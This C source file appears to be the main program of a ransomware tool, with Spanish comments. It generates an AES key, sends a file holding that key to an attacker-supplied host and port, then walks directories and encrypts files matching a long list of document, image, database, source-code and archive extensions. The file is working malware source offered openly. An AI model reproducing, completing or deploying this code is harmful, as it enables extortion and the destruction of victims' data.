#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "llbis/create_flag.h"
#include "llbis/cifrar.h"
#include "llbis/gen_aes.h"
#include "llbis/end_file.h"
#include "llbis/send_file.h"
#include "llbis/key_pub.h"
//#include "list_files.h"
//#include "find_ext.h"


char path[100000]="./test";
char extension[][10] = {
    ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
    ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
    ".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",
    ".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",
    ".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",
    ".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",
    ".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",
    ".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",
    ".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",
    ".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",
    ".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",
    ".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",
    ".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",
    ".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",
    ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
    ".zip",".7zip"
}; //agregar como lista de extensiones
int ext_len = sizeof(extension)/(sizeof(char)*10);

int find_ext(char file[]){
    for(int i=0; i<ext_len; i++){
        if(strstr(file,extension[i]) != NULL && strstr(file,".ntd") == NULL){ // que no tenga .ntd (revisar doc strstr)
            return 1;
        }
    }
    return 0;
}

int list_files(int n, int h, char key[])
{
    /*debug
    if(h == 3){
        printf("%s\n",path);
    }*/
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                if(dir->d_type == DT_DIR){
                    if(h==0 && (!strcmp(dir->d_name,"boot") || !strcmp(dir->d_name,"etc") || !strcmp(dir->d_name,"proc"))){
                        printf("este dic %s no lo toco\n",dir->d_name);
                    }else{
                        strcat(path,"/");
                        strcat(path, dir->d_name);
                        list_files(strlen(path), h+1, key);
                    }
                    path[n] = 0;
                }else if(dir->d_type == DT_REG){
                    if(find_ext(dir->d_name)){
                        //printf("%s/%s -> Filesito\n", path,dir->d_name);
                        cifrar(path, dir->d_name, key);
                    }
                }
            }
        }
        closedir(d);
    }
    return(0);
}

void main(int argc, char * argv[]){
    if(argc != 3){
        fprintf(stderr,"No po\n");
        exit(69);
    }
    //Create flag
    create_flag("./flag.ntd");
    //Key AES para el cifrado de ficheros
    char key[48];
    strcat(key,gen_aes());
    //Key RSA Pub
    key_pub(1);
    //Creando fichero con informacion confidencial para enviar al dueño del ransomware
    end_file(key);
    //Enviando fichero confidencial
    send_file("enviame.enc",argv[1],argv[2]);
    //Del RSA Pub
    key_pub(0);
    //Listar ficheros y cifrar
    list_files(strlen(path),0,key);
}